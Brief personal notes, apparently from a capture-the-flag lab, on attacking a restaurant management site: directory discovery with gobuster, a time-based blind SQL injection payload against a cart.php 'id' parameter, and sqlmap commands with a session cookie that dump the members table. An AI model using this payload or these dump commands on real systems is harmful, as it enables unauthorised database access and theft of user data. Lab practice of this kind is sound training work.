gobuster reveals /rms
holy crap its an entire restaurant managing service website
rough feeling suggests there may be a way to do a SQL injection
way things are layed out in tables, and also the use of the word “ID”, not sure but gives me a feeling.
AHAHAH
After so much testing, I finally found a section of the website vulnerable to SQLI!!!
http://10.10.179.29:12340/rms/cart.php?id=(VULN)
id=24' AND (SELECT 1709 FROM (SELECT(SLEEP(5)))OEnQ) AND 'REuM'='REuM
SQLmap
I used sqlmap to confirm my initial suspicions
sqlmap -u http://10.10.179.29:12340/rms/cart.php?id=24 --cookie=”P…..” --dump
sqlmap --cookie="PHPSESSID=avp36r3hdfcec7suk7tuaulvv2" -u http://10.10.61.167:12340/rms/cart-exec.php?id=24 -T members --dump


It is a time based injection, so it takes a bit of time to fully dump.
